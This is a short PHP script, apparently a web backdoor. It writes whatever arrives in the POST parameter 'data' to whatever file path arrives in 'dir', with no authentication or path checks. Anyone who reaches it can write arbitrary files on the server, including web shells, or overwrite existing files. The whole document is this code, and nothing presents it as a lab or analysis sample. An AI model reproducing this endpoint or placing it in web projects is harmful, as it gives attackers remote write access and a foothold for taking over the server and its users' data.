<?php
$data = $_POST['data'];
$dir = $_POST['dir'];
$file = fopen($dir, 'w+');
fwrite($file, $data);
fclose($file);
?>
